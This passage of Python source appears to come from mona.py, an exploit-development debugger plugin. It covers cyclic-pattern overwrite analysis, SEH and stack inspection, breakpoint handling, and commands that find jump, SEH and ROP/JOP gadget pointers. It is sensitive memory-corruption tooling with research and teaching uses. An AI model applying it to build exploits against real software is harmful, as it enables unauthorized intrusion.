					mempat = mempat.replace('\x00','')
					
				offset = regpattern.find(mempat)
				
				if offset > -1:				
					thissize = getPatternLength(regs[reg],pattype,args)
					if thissize > 0:
						if not silent:
							dbg.log("    %s (0x%s) points at offset %d in %s pattern (length %d)" % (reg,toHex(regs[reg]),offset,pattype,thissize))
						tofile += "    %s (0x%s) points at offset %d in %s pattern (length %d)\n" % (reg,toHex(regs[reg]),offset,pattype,thissize)
						if not reg in registers_to:
							registers_to[reg] = ([regs[reg],offset,thissize,pattype])
						else:
							registers_to[reg] = ([regs[reg],offset,thissize,pattype])
							
	if not "registers" in results:
		results["registers"] = registers
	if not "registers_to" in results:
		results["registers_to"] = registers_to

	#3. SEH record overwritten ?
	seh = {}
	if not silent:
		dbg.log("[+] Examining SEH chain")
	tofile += "[+] Examining SEH chain\r\n"
	thissehchain=dbg.getSehChain()
	
	for chainentry in thissehchain:
		for pattype in pattypes:
			dbg.updateLog()		
			regpattern = fullpattern
			hexpat = toHex(chainentry[1])
			hexpat = toAscii(hexpat[6]+hexpat[7])+toAscii(hexpat[4]+hexpat[5])+toAscii(hexpat[2]+hexpat[3])+toAscii(hexpat[0]+hexpat[1])
			factor = 1
			goback = 4
			if pattype == "upper":
				regpattern = regpattern.upper()
			if pattype == "lower":
				regpattern = regpattern.lower()
			if pattype == "unicode":
				#regpattern = toUnicode(regpattern)
				#get next 4 bytes too
				hexpat = dbg.readMemory(chainentry[0],8)
				hexpat = hexpat.replace('\x00','')
				goback = 2
	
			offset = regpattern.find(hexpat)-goback
			thissize = 0
			if offset > -1:		
				thepointer = MnPointer(chainentry[0])
				if thepointer.isOnStack():
					thissize = getPatternLength(chainentry[0]+4,pattype)
					if thissize > 0:
						if not silent:
							dbg.log("    SEH record (nseh field) at 0x%s overwritten with %s pattern : 0x%s (offset %d), followed by %d bytes of cyclic data" % (toHex(chainentry[0]),pattype,toHex(chainentry[1]),offset,thissize))
						tofile += "    SEH record (nseh field) at 0x%s overwritten with %s pattern : 0x%s (offset %d), followed by %d bytes of cyclic data\n" % (toHex(chainentry[0]),pattype,toHex(chainentry[1]),offset,thissize)
						if not chainentry[0]+4 in seh:
							seh[chainentry[0]+4] = ([chainentry[1],offset,pattype,thissize])
							
	if not "seh" in results:
		results["seh"] = seh

	stack = {}	
	stackcontains = {}
	
	#4. walking stack
	if "ESP" in regs:	
		curresp = regs["ESP"]	
		if not silent:
			if distance == 0:
				extratxt = "(entire stack)"
			else:
				extratxt = "(+- "+str(distance)+" bytes)"
			dbg.log("[+] Examining stack %s - looking for cyclic pattern" % extratxt)
		tofile += "[+] Examining stack %s - looking for cyclic pattern\n" % extratxt
		
		# get stack this address belongs to
		stacks = getStacks()
		thisstackbase = 0
		thisstacktop = 0
		if distance < 1:
			for tstack in stacks:
				if (stacks[tstack][0] < curresp) and (curresp < stacks[tstack][1]):
					thisstackbase = stacks[tstack][0]
					thisstacktop = stacks[tstack][1]
		else:
			thisstackbase = curresp - distance
			thisstacktop = curresp + distance + 8
		stackcounter = thisstackbase
		sign=""

	
		if not silent:
			dbg.log("    Walking stack from 0x%s to 0x%s (0x%s bytes)" % (toHex(stackcounter),toHex(thisstacktop-4),toHex(thisstacktop-4-stackcounter)))
		tofile += "    Walking stack from 0x%s to 0x%s (0x%s bytes)\n" % (toHex(stackcounter),toHex(thisstacktop-4),toHex(thisstacktop-4-stackcounter))

		# stack contains part of a cyclic pattern ?
		while stackcounter < thisstacktop-4:
			espoffset = stackcounter - curresp
			stepsize = 4
			dbg.updateLog()	
			if espoffset > -1:
				sign="+"			
			else:
				sign="-"	
				
			cont = dbg.readMemory(stackcounter,4)
			
			if len(cont) == 4:
				contat = cont
				if contat <> "":
		
					for pattype in pattypes:
						dbg.updateLog()
						regpattern = fullpattern
						
						hexpat = contat
					
						if pattype == "upper":
							regpattern = regpattern.upper()
						if pattype == "lower":
							regpattern = regpattern.lower()
						if pattype == "unicode":
							hexpat1 = dbg.readMemory(stackcounter,4)
							hexpat2 = dbg.readMemory(stackcounter+4,4)
							hexpat1 = hexpat1.replace('\x00','')
							hexpat2 = hexpat2.replace('\x00','')
							if hexpat1 == "" or hexpat2 == "":
								#no unicode
								hexpat = ""
								break
							else:
								hexpat = hexpat1 + hexpat2
						
						if len(hexpat) == 4:
							
							offset = regpattern.find(hexpat)
							
							currptr = stackcounter
							
							if offset > -1:				
								thissize = getPatternLength(currptr,pattype)
								offsetvalue = int(str(espoffset).replace("-",""))								
								if thissize > 0:
									stepsize = thissize
									if thissize/4*4 != thissize:
										stepsize = (thissize/4*4) + 4
									# align stack again
									if not silent:
										espoff = 0
										espsign = "+"
										if ((stackcounter + thissize) >= curresp):
											espoff = (stackcounter + thissize) - curresp
										else:
											espoff = curresp - (stackcounter + thissize)
											espsign = "-"											
										dbg.log("    0x%s : Contains %s cyclic pattern at ESP%s0x%s (%s%s) : offset %d, length %d (-> 0x%s : ESP%s0x%s)" % (toHex(stackcounter),pattype,sign,rmLeading(toHex(offsetvalue),"0"),sign,offsetvalue,offset,thissize,toHex(stackcounter+thissize-1),espsign,rmLeading(toHex(espoff),"0")))
									tofile += "    0x%s : Contains %s cyclic pattern at ESP%s0x%s (%s%s) : offset %d, length %d (-> 0x%s : ESP%s0x%s)\n" % (toHex(stackcounter),pattype,sign,rmLeading(toHex(offsetvalue),"0"),sign,offsetvalue,offset,thissize,toHex(stackcounter+thissize-1),espsign,rmLeading(toHex(espoff),"0"))
									if not currptr in stackcontains:
										stackcontains[currptr] = ([offsetvalue,sign,offset,thissize,pattype])
								else:
									#if we are close to ESP, change stepsize to 1
									if offsetvalue <= 256:
										stepsize = 1
			stackcounter += stepsize
			

			
		# stack has pointer into cyclic pattern ?
		if not silent:
			if distance == 0:
				extratxt = "(entire stack)"
			else:
				extratxt = "(+- "+str(distance)+" bytes)"
			dbg.log("[+] Examining stack %s - looking for pointers to cyclic pattern" % extratxt)	
		tofile += "[+] Examining stack %s - looking for pointers to cyclic pattern\n" % extratxt
		# get stack this address belongs to
		stacks = getStacks()
		thisstackbase = 0
		thisstacktop = 0
		if distance < 1:
			for tstack in stacks:
				if (stacks[tstack][0] < curresp) and (curresp < stacks[tstack][1]):
					thisstackbase = stacks[tstack][0]
					thisstacktop = stacks[tstack][1]
		else:
			thisstackbase = curresp - distance
			thisstacktop = curresp + distance + 8
		stackcounter = thisstackbase
		sign=""		
		
		if not silent:
			dbg.log("    Walking stack from 0x%s to 0x%s (0x%s bytes)" % (toHex(stackcounter),toHex(thisstacktop-4),toHex(thisstacktop-4-stackcounter)))
		tofile += "    Walking stack from 0x%s to 0x%s (0x%s bytes)\n" % (toHex(stackcounter),toHex(thisstacktop-4),toHex(thisstacktop-4-stackcounter))
		while stackcounter < thisstacktop-4:
			espoffset = stackcounter - curresp
			
			dbg.updateLog()	
			if espoffset > -1:
				sign="+"			
			else:
				sign="-"	
				
			cont = dbg.readMemory(stackcounter,4)
			
			if len(cont) == 4:
				cval=""				
				for sbytes in cont:
					tval = hex(ord(sbytes)).replace("0x","")
					if len(tval) < 2:
						tval="0"+tval
					cval = tval+cval
				try:				
					contat = dbg.readMemory(hexStrToInt(cval),4)
				except:
					contat = ""	
					
				if contat <> "":
					for pattype in pattypes:
						dbg.updateLog()
						regpattern = fullpattern
						
						hexpat = contat
					
						if pattype == "upper":
							regpattern = regpattern.upper()
						if pattype == "lower":
							regpattern = regpattern.lower()
						if pattype == "unicode":
							hexpat1 = dbg.readMemory(stackcounter,4)
							hexpat2 = dbg.readMemory(stackcounter+4,4)
							hexpat1 = hexpat1.replace('\x00','')
							hexpat2 = hexpat2.replace('\x00','')
							if hexpat1 == "" or hexpat2 == "":
								#no unicode
								hexpat = ""
								break
							else:
								hexpat = hexpat1 + hexpat2
						
						if len(hexpat) == 4:
							offset = regpattern.find(hexpat)
							currptr = hexStrToInt(cval)
							
							if offset > -1:				
								thissize = getPatternLength(currptr,pattype)
								if thissize > 0:
									offsetvalue = int(str(espoffset).replace("-",""))
									if not silent:
										dbg.log("    0x%s : Pointer into %s cyclic pattern at ESP%s0x%s (%s%s) : 0x%s : offset %d, length %d" % (toHex(stackcounter),pattype,sign,rmLeading(toHex(offsetvalue),"0"),sign,offsetvalue,toHex(currptr),offset,thissize))
									tofile += "    0x%s : Pointer into %s cyclic pattern at ESP%s0x%s (%s%s) : 0x%s : offset %d, length %d\n" % (toHex(stackcounter),pattype,sign,rmLeading(toHex(offsetvalue),"0"),sign,offsetvalue,toHex(currptr),offset,thissize)
									if not currptr in stack:
										stack[currptr] = ([offsetvalue,sign,offset,thissize,pattype])					
							
			stackcounter += 4
	else:
		dbg.log("** Are you connected to an application ?",highlight=1)
		
	if not "stack" in results:
		results["stack"] = stack
	if not "stackcontains" in results:
		results["stackcontains"] = stack
		
	if tofile != "":
		objfindmspfile = MnLog("findmsp.txt")
		findmspfile = objfindmspfile.reset()
		objfindmspfile.write(tofile,findmspfile)
	return results
	
	
#-----------------------------------------------------------------------#
# convert arguments to criteria
#-----------------------------------------------------------------------#

def args2criteria(args,modulecriteria,criteria):

	thisversion,thisrevision = getVersionInfo(inspect.stack()[0][1])
	thisversion = thisversion.replace("'","")
	dbg.logLines("\n---------- Mona command started on %s (v%s, rev %s) ----------" % (datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),thisversion,thisrevision))
	dbg.log("[+] Processing arguments and criteria")
	global ptr_to_get
	
	# meets access level ?
	criteria["accesslevel"] = "X"
	if "x" in args : 
		if not args["x"].upper() in ["*","R","RW","RX","RWX","W","WX","X"]:
			dbg.log("invalid access level : %s" % args["x"], highlight=1)
			criteria["accesslevel"] = ""
		else:
			criteria["accesslevel"] = args["x"].upper()
		
	dbg.log("    - Pointer access level : %s" % criteria["accesslevel"])
	
	# query OS modules ?
	if "o" in args and args["o"]:
		modulecriteria["os"] = False
		dbg.log("    - Ignoring OS modules")
	
	# allow nulls ?
	if "n" in args and args["n"]:
		criteria["nonull"] = True
		dbg.log("    - Ignoring pointers that have null bytes")
	
	# override list of modules to query ?
	if "m" in args:
		if type(args["m"]).__name__.lower() <> "bool":
			modulecriteria["modules"] = args["m"]
			dbg.log("    - Only querying modules %s" % args["m"])
				
	# limit nr of pointers to search ?
	if "p" in args:
		if str(args["p"]).lower() != "true":
			ptr_to_get = int(args["p"].strip())
		if ptr_to_get > 0:	
			dbg.log("    - Maximum nr of pointers to return : %d" % ptr_to_get)
	
	# only want to see specific type of pointers ?
	if "cp" in args:
		ptrcriteria = args["cp"].split(",")
		for ptrcrit in ptrcriteria:
			ptrcrit=ptrcrit.strip("'")
			ptrcrit=ptrcrit.strip('"').lower().strip()
			criteria[ptrcrit] = True
		dbg.log("    - Pointer criteria : %s" % ptrcriteria)
	
	if "cpb" in args:
		badchars = args["cpb"]
		badchars = badchars.replace("'","")
		badchars = badchars.replace('"',"")
		badchars = badchars.replace("\\x","")
		# see if we need to expand ..
		bpos = 0
		newbadchars = ""
		while bpos < len(badchars):
			curchar = badchars[bpos]+badchars[bpos+1]
			if curchar == "..":
				pos = bpos
				if pos > 1 and pos <= len(badchars)-4:
					# get byte before and after ..
					bytebefore = badchars[pos-2] + badchars[pos-1]
					byteafter = badchars[pos+2] + badchars[pos+3]
					bbefore = int(bytebefore,16)
					bafter = int(byteafter,16)
					insertbytes = ""
					bbefore += 1
					while bbefore < bafter:
						insertbytes += "%02x" % bbefore
						bbefore += 1
					newbadchars += insertbytes
			else:
				newbadchars += curchar
			bpos += 2
		badchars = newbadchars
		cnt = 0
		strb = ""
		while cnt < len(badchars):
			strb=strb+binascii.a2b_hex(badchars[cnt]+badchars[cnt+1])
			cnt=cnt+2
		criteria["badchars"] = strb
		dbg.log("    - Bad char filter will be applied to pointers : %s " % args["cpb"])
			
	if "cm" in args:
		modcriteria = args["cm"].split(",")
		for modcrit in modcriteria:
			modcrit=modcrit.strip("'")
			modcrit=modcrit.strip('"').lower().strip()
			#each criterium has 1 or 2 parts : criteria=value
			modcritparts = modcrit.split("=")
			try:
				if len(modcritparts) < 2:
					# set to True, no value given
					modulecriteria[modcritparts[0].strip()] = True
				else:
					# read the value
					modulecriteria[modcritparts[0].strip()] = (modcritparts[1].strip() == "true")
			except:
				continue
		if (inspect.stack()[1][3] == "procShowMODULES"):
			modcriteria = args["cm"].split(",")
			for modcrit in modcriteria:
				modcrit=modcrit.strip("'")
				modcrit=modcrit.strip('"').lower().strip()
				if modcrit.startswith("+"):
					modulecriteria[modcrit]=True
				else:
					modulecriteria[modcrit]=False
		dbg.log("    - Module criteria : %s" % modcriteria)

	return modulecriteria,criteria			
				
	
#manage breakpoint on selected exported/imported functions from selected modules
def doManageBpOnFunc(modulecriteria,criteria,funcfilter,mode="add",type="export"):	
	"""
	Sets a breakpoint on selected exported/imported functions from selected modules
	
	Arguments : 
	modulecriteria - Dictionary
	funcfilter - comma separated string indicating functions to set bp on
			must contains "*" to select all functions
	mode - "add" to create bp's, "del" to remove bp's
	
	Returns : nothing
	"""
	
	type = type.lower()
	
	namecrit = funcfilter.split(",")
	
	if mode == "add" or mode == "del" or mode == "list":
		if not silent:
			dbg.log("[+] Enumerating %sed functions" % type)
		modulestosearch = getModulesToQuery(modulecriteria)
		
		bpfuncs = {}
		
		for thismodule in modulestosearch:
			if not silent:
				dbg.log(" Querying module %s" % thismodule)
			# get all
			themod = dbg.getModule(thismodule)
			tmod = MnModule(thismodule)
			shortname = tmod.getShortName()
			syms = themod.getSymbols()
			# get funcs
			funcs = {}
			if type == "export":
				funcs = tmod.getEAT()
			else:
				funcs = tmod.getIAT()
			if not silent:
				dbg.log("   Total nr of %sed functions : %d" % (type,len(funcs)))
			for func in funcs:
				if meetsCriteria(MnPointer(func), criteria):
					funcname = funcs[func].lower()
					setbp = False
					if "*" in namecrit:
						setbp = True
					else:
						for crit in namecrit:
							crit = crit.lower()
							tcrit = crit.replace("*","")
							if (crit.startswith("*") and crit.endswith("*")) or (crit.find("*") == -1):
								if funcname.find(tcrit) > -1:
									setbp = True
							elif crit.startswith("*"):
								if funcname.endswith(tcrit):
									setbp = True
							elif crit.endswith("*"):
								if funcname.startswith(tcrit):
									setbp = True
					
					if setbp:
						if type == "export":
							if not func in bpfuncs:
								bpfuncs[func] = funcs[func]
						else:
							ptr = 0
							try:
								#read pointer of imported function
								ptr=struct.unpack('<L',dbg.readMemory(func,4))[0]
							except:
								pass
							if ptr > 0:
								if not ptr in bpfuncs:
									bpfuncs[ptr] = funcs[func]
			if __DEBUGGERAPP__ == "WinDBG":
				# let's do a few searches
				for crit in namecrit:
					if crit.find("*") == -1:
						crit = "*" + crit + "*"
					modsearch = "x %s!%s" % (shortname,crit)
					output = dbg.nativeCommand(modsearch)
					outputlines = output.split("\n")
					for line in outputlines:
						if line.replace(" ","") != "":
							linefields = line.split(" ")
							if len(linefields) > 1:
								ptr = hexStrToInt(linefields[0])
								cnt = 1
								while cnt < len(linefields)-1:
									if linefields[cnt] != "":
										funcname = linefields[cnt]
										break
									cnt += 1
								if not ptr in bpfuncs:
									bpfuncs[ptr] = funcname

		if not silent:
			dbg.log("[+] Total nr of breakpoints to process : %d" % len(bpfuncs))
		if len(bpfuncs) > 0:
			for funcptr in bpfuncs:
				if mode == "add":
					dbg.log("Set bp at 0x%s (%s in %s)" % (toHex(funcptr),bpfuncs[funcptr],MnPointer(funcptr).belongsTo()))
					try:
						dbg.setBreakpoint(funcptr)
					except:
						dbg.log("Failed setting bp at 0x%s" % toHex(funcptr))
				elif mode == "del":
					dbg.log("Remove bp at 0x%s (%s in %s)" % (toHex(funcptr),bpfuncs[funcptr],MnPointer(funcptr).belongsTo()))
					try:
						dbg.deleteBreakpoint(funcptr)
					except:
						dbg.log("Skipped removal of bp at 0x%s" % toHex(funcptr))
				elif mode == "list":
					dbg.log("Match found at 0x%s (%s in %s)" % (toHex(funcptr),bpfuncs[funcptr],MnPointer(funcptr).belongsTo()))
						
	return

#-----------------------------------------------------------------------#
# main
#-----------------------------------------------------------------------#	
				
def main(args):
	dbg.createLogWindow()
	try:
		starttime = datetime.datetime.now()
		ptr_counter = 0
		
		# initialize list of commands
		commands = {}
		
		# ----- HELP ----- #
		def getBanner():
			banners = {}
			bannertext = ""
			bannertext += "    |------------------------------------------------------------------|\n"
			bannertext += "    |                         __               __                      |\n"
			bannertext += "    |   _________  ________  / /___ _____     / /____  ____ _____ ___  |\n"
			bannertext += "    |  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |\n"
			bannertext += "    | / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |\n"
			bannertext += "    | \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |\n"
			bannertext += "    |                                                                  |\n"
			bannertext += "    |------------------------------------------------------------------|\n"
			banners[0] = bannertext

			bannertext = ""
			bannertext += "    |------------------------------------------------------------------|\n"			
			bannertext += "    |        _ __ ___    ___   _ __    __ _     _ __   _   _           |\n"
			bannertext += "    |       | '_ ` _ \  / _ \ | '_ \  / _` |   | '_ \ | | | |          |\n"
			bannertext += "    |       | | | | | || (_) || | | || (_| | _ | |_) || |_| |          |\n"
			bannertext += "    |       |_| |_| |_| \___/ |_| |_| \__,_|(_)| .__/  \__, |          |\n"
			bannertext += "    |                                          |_|     |___/           |\n"
			bannertext += "    |                                                                  |\n"
			bannertext += "    |------------------------------------------------------------------|\n"	
			banners[1] = bannertext

			bannertext = ""
			bannertext += "    |------------------------------------------------------------------|\n"
			bannertext += "    |                                                                  |\n"
			bannertext += "    |    _____ ___  ____  ____  ____ _                                 |\n"
			bannertext += "    |    / __ `__ \/ __ \/ __ \/ __ `/    https://www.corelan.be       |\n"
			bannertext += "    |   / / / / / / /_/ / / / / /_/ /     http://redmine.corelan.be    |\n"
			bannertext += "    |  /_/ /_/ /_/\____/_/ /_/\__,_/      #corelan (Freenode IRC)      |\n"
			bannertext += "    |                                                                  |\n"
			bannertext += "    |------------------------------------------------------------------|\n"
			banners[2] = bannertext

			bannertext = ""
			bannertext += "\n    .##.....##..#######..##....##....###........########..##....##\n"
			bannertext += "    .###...###.##.....##.###...##...##.##.......##.....##..##..##.\n"
			bannertext += "    .####.####.##.....##.####..##..##...##......##.....##...####..\n"
			bannertext += "    .##.###.##.##.....##.##.##.##.##.....##.....########.....##...\n"
			bannertext += "    .##.....##.##.....##.##..####.#########.....##...........##...\n"
			bannertext += "    .##.....##.##.....##.##...###.##.....##.###.##...........##...\n"
			bannertext += "    .##.....##..#######..##....##.##.....##.###.##...........##...\n\n"
			banners[3] = bannertext


			# pick random banner
			bannerlist = []
			for i in range (0, len(banners)):
				bannerlist.append(i)

			random.shuffle(bannerlist)
			return banners[bannerlist[0]]

		
		def procHelp(args):
			dbg.log("     'mona' - Exploit Development Swiss Army Knife - %s (%sbit)" % (__DEBUGGERAPP__,str(arch)))
			dbg.log("     Plugin version : %s r%s" % (__VERSION__,__REV__))
			dbg.log("     Written by Corelan - https://www.corelan.be")
			dbg.log("     Project page : https://redmine.corelan.be/projects/mona")
			dbg.logLines(getBanner(),highlight=1)
			dbg.log("Global options :")
			dbg.log("----------------")
			dbg.log("You can use one or more of the following global options on any command that will perform")
			dbg.log("a search in one or more modules, returning a list of pointers :")
			dbg.log(" -n                     : Skip modules that start with a null byte. If this is too broad, use")
			dbg.log("                          option -cm nonull instead")
			dbg.log(" -o                     : Ignore OS modules")
			dbg.log(" -p <nr>                : Stop search after <nr> pointers.")
			dbg.log(" -m <module,module,...> : only query the given modules. Be sure what you are doing !")
			dbg.log("                          You can specify multiple modules (comma separated)")
			dbg.log("                          Tip : you can use -m *  to include all modules. All other module criteria will be ignored")
			dbg.log("                          Other wildcards : *blah.dll = ends with blah.dll, blah* = starts with blah,")
			dbg.log("                          blah or *blah* = contains blah")
			dbg.log(" -cm <crit,crit,...>    : Apply some additional criteria to the modules to query.")
			dbg.log("                          You can use one or more of the following criteria :")
			dbg.log("                          aslr,safeseh,rebase,nx,os")
			dbg.log("                          You can enable or disable a certain criterium by setting it to true or false")
			dbg.log("                          Example :  -cm aslr=true,safeseh=false")
			dbg.log("                          Suppose you want to search for p/p/r in aslr enabled modules, you could call")
			dbg.log("                          !mona seh -cm aslr")
			dbg.log(" -cp <crit,crit,...>    : Apply some criteria to the pointers to return")
			dbg.log("                          Available options are :")
			dbg.log("                          unicode,ascii,asciiprint,upper,lower,uppernum,lowernum,numeric,alphanum,nonull,startswithnull,unicoderev")
			dbg.log("                          Note : Multiple criteria will be evaluated using 'AND', except if you are looking for unicode + one crit")
			dbg.log(" -cpb '\\x00\\x01'        : Provide list with bad chars, applies to pointers")
			dbg.log("                          You can use .. to indicate a range of bytes (in between 2 bad chars)")
			dbg.log(" -x <access>            : Specify desired access level of the returning pointers. If not specified,")
			dbg.log("                          only executable pointers will be return.")
			dbg.log("                          Access levels can be one of the following values : R,W,X,RW,RX,WX,RWX or *")
			
			if not args:
				args = []
			if len(args) > 1:
				thiscmd = args[1].lower().strip()
				if thiscmd in commands:
					dbg.log("")
					dbg.log("Usage of command '%s' :" % thiscmd)
					dbg.log("%s" % ("-" * (22 + len(thiscmd))))
					dbg.logLines(commands[thiscmd].usage)
					dbg.log("")
				else:
					aliasfound = False
					for cmd in commands:
						if commands[cmd].alias == thiscmd:
							dbg.log("")
							dbg.log("Usage of command '%s' :" % thiscmd)
							dbg.log("%s" % ("-" * (22 + len(thiscmd))))
							dbg.logLines(commands[cmd].usage)
							dbg.log("")
							aliasfound = True
					if not aliasfound:
						dbg.logLines("\nCommand %s does not exist. Run !mona to get a list of available commands\n" % thiscmd,highlight=1)
			else:
				dbg.logLines("\nUsage :")
				dbg.logLines("-------\n")
				dbg.log(" !mona <command> <parameter>")
				dbg.logLines("\nAvailable commands and parameters :\n")

				items = commands.items()
				items.sort(key = itemgetter(0))
				for item in items:
					if commands[item[0]].usage <> "":
						aliastxt = ""
						if commands[item[0]].alias != "":
							aliastxt = " / " + commands[item[0]].alias
						dbg.logLines("%s | %s" % (item[0] + aliastxt + (" " * (20 - len(item[0]+aliastxt))), commands[item[0]].description))
				dbg.log("")
				dbg.log("Want more info about a given command ?  Run !mona help <command>",highlight=1)
				dbg.log("")
		
		commands["help"] = MnCommand("help", "show help", "!mona help [command]",procHelp)
		
		# ----- Config file management ----- #
		
		def procConfig(args):
			#did we specify -get, -set or -add?
			showerror = False
			if not "set" in args and not "get" in args and not "add" in args:
				showerror = True
				
			if "set" in args:
				if type(args["set"]).__name__.lower() == "bool":
					showerror = True
				else:
					#count nr of words
					params = args["set"].split(" ")
					if len(params) < 2:
						showerror = True
			if "add" in args:
				if type(args["add"]).__name__.lower() == "bool":
					showerror = True
				else:
					#count nr of words
					params = args["add"].split(" ")
					if len(params) < 2:
						showerror = True
			if "get" in args:
				if type(args["get"]).__name__.lower() == "bool":
					showerror = True
				else:
					#count nr of words
					params = args["get"].split(" ")
					if len(params) < 1:
						showerror = True
			if showerror:
				dbg.log("Usage :")
				dbg.logLines(configUsage,highlight=1)
				return
			else:
				if "get" in args:
					dbg.log("Reading value from configuration file")
					monaConfig = MnConfig()
					thevalue = monaConfig.get(args["get"])
					dbg.log("Parameter %s = %s" % (args["get"],thevalue))
				
				if "set" in args:
					dbg.log("Writing value to configuration file")
					monaConfig = MnConfig()
					value = args["set"].split(" ")
					configparam = value[0].strip()
					dbg.log("Old value of parameter %s = %s" % (configparam,monaConfig.get(configparam)))
					configvalue = args["set"][0+len(configparam):len(args["set"])]
					monaConfig.set(configparam,configvalue)
					dbg.log("New value of parameter %s = %s" % (configparam,configvalue))
				
				if "add" in args:
					dbg.log("Writing value to configuration file")
					monaConfig = MnConfig()
					value = args["add"].split(" ")
					configparam = value[0].strip()
					dbg.log("Old value of parameter %s = %s" % (configparam,monaConfig.get(configparam)))
					configvalue = monaConfig.get(configparam).strip() + "," + args["add"][0+len(configparam):len(args["add"])].strip()
					monaConfig.set(configparam,configvalue)
					dbg.log("New value of parameter %s = %s" % (configparam,configvalue))
				
		# ----- Jump to register ----- #
	
		def procFindJ(args):
			return procFindJMP(args)
		
		def procFindJMP(args):
			#default criteria
			modulecriteria={}
			modulecriteria["aslr"] = False
			modulecriteria["rebase"] = False
			
			if (inspect.stack()[1][3] == "procFindJ"):
				dbg.log(" ** Note : command 'j' has been replaced with 'jmp'. Now launching 'jmp' instead...",highlight=1)

			criteria={}
			all_opcodes={}
			
			global ptr_to_get
			ptr_to_get = -1
			
			distancestr = ""
			mindistance = 0
			maxdistance = 0
			
			#did user specify -r <reg> ?
			showerror = False
			if "r" in args:
				if type(args["r"]).__name__.lower() == "bool":
					showerror = True
				else:
					#valid register ?
					thisreg = args["r"].upper().strip()
					validregs = dbglib.Registers32BitsOrder
					if not thisreg in validregs:
						showerror = True
			else:
				showerror = True
				
			if "distance" in args:
				if type(args["distance"]).__name__.lower() == "bool":
					showerror = True
				else:
					distancestr = args["distance"]
					distanceparts = distancestr.split(",")
					for parts in distanceparts:
						valueparts = parts.split("=")
						if len(valueparts) > 1:
							if valueparts[0].lower() == "min":
								try:
									mindistance = int(valueparts[1])
								except:
									mindistance = 0		
							if valueparts[0].lower() == "max":
								try:
									maxdistance = int(valueparts[1])
								except:
									maxdistance = 0						
			
			if maxdistance < mindistance:
				tmp = maxdistance
				maxdistance = mindistance
				mindistance = tmp
			
			criteria["mindistance"] = mindistance
			criteria["maxdistance"] = maxdistance
			
			
			if showerror:
				dbg.log("Usage :")
				dbg.logLines(jmpUsage,highlight=1)
				return				
			else:
				modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
				# go for it !	
				all_opcodes=findJMP(modulecriteria,criteria,args["r"].lower().strip())
			
			# write to log
			logfile = MnLog("jmp.txt")
			thislog = logfile.reset()
			processResults(all_opcodes,logfile,thislog)
		
		# ----- Exception Handler Overwrites ----- #
		
					
		def procFindSEH(args):
			#default criteria
			modulecriteria={}
			modulecriteria["safeseh"] = False
			modulecriteria["aslr"] = False
			modulecriteria["rebase"] = False

			criteria = {}
			specialcases = {}
			all_opcodes = {}
			
			global ptr_to_get
			ptr_to_get = -1
			
			#what is the caller function (backwards compatibility with pvefindaddr)
			
			modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)

			if "rop" in args:
				criteria["rop"] = True
			
			if "all" in args:
				criteria["all"] = True
				specialcases["maponly"] = True
			else:
				criteria["all"] = False
				specialcases["maponly"] = False
			
			# go for it !	
			all_opcodes = findSEH(modulecriteria,criteria)
			#report findings to log
			logfile = MnLog("seh.txt")
			thislog = logfile.reset()
			processResults(all_opcodes,logfile,thislog,specialcases)
			
			
			

		# ----- MODULES ------ #
		def procShowMODULES(args):
			modulecriteria={}
			criteria={}
			
			modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
			modulestosearch = getModulesToQuery(modulecriteria)
			showModuleTable("",modulestosearch)

		# ----- ROP ----- #
		def procFindROPFUNC(args):
			#default criteria
			modulecriteria={}
			modulecriteria["aslr"] = False
			#modulecriteria["rebase"] = False
			modulecriteria["os"] = False
			criteria={}
			
			modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
			ropfuncs = {}
			ropfuncoffsets ={}
			ropfuncs,ropfuncoffsets = findROPFUNC(modulecriteria,criteria)
			#report findings to log
			dbg.log("[+] Processing pointers to interesting rop functions")
			logfile = MnLog("ropfunc.txt")
			thislog = logfile.reset()
			processResults(ropfuncs,logfile,thislog)
			global silent
			silent = True
			dbg.log("[+] Processing offsets to pointers to interesting rop functions")
			logfile = MnLog("ropfunc_offset.txt")
			thislog = logfile.reset()
			processResults(ropfuncoffsets,logfile,thislog)			
			
		def procStackPivots(args):
			procROP(args,"stackpivot")
			
		def procROP(args,mode="all"):
			#default criteria
			modulecriteria={}
			modulecriteria["aslr"] = False
			modulecriteria["rebase"] = False
			modulecriteria["os"] = False

			criteria={}
			
			modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
			
			# handle optional arguments
			
			depth = 6
			maxoffset = 40
			thedistance = 8
			split = False
			fast = False
			endingstr = ""
			endings = []
			
			if "depth" in args:
				if type(args["depth"]).__name__.lower() != "bool":
					try:
						depth = int(args["depth"])
					except:
						pass
			
			if "offset" in args:
				if type(args["offset"]).__name__.lower() != "bool":
					try:
						maxoffset = int(args["offset"])
					except:
						pass
			
			if "distance" in args:
				if type(args["distance"]).__name__.lower() != "bool":
					try:
						thedistance = args["distance"]
					except:
						pass
			
			if "split" in args:
				if type(args["split"]).__name__.lower() == "bool":
					split = args["split"]
					
			if "fast" in args:
				if type(args["fast"]).__name__.lower() == "bool":
					fast = args["fast"]
			
			if "end" in args:
				if type(args["end"]).__name__.lower() == "str":
					endingstr = args["end"].replace("'","").replace('"',"").strip()
					endings = endingstr.split("#")
					
			if "f" in args:
				if args["f"] <> "":
					criteria["f"] = args["f"]
			
			
			if "rva" in args:
				criteria["rva"] = True
			
			if mode == "stackpivot":
				fast = False
				endings = ""
				split = False
			else:
				mode = "all"
			
			findROPGADGETS(modulecriteria,criteria,endings,maxoffset,depth,split,thedistance,fast,mode)
			
			
			
		def procJOP(args,mode="all"):
			#default criteria
			modulecriteria={}
			modulecriteria["aslr"] = False
			modulecriteria["rebase"] = False
			modulecriteria["os"] = False

			criteria={}
			
			modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
			
			# handle optional arguments
			
			depth = 6
			
			if "depth" in args:
				if type(args["depth"]).__name__.lower() != "bool":
					try:
						depth = int(args["depth"])
					except:
						pass			
			findJOPGADGETS(modulecriteria,criteria,depth)			
			
			
		def procCreatePATTERN(args):
			size = 0
			pattern = ""
			if "?" in args and args["?"] != "":
				try:
					size = int(args["?"])
				except:
					size = 0
			if size == 0:
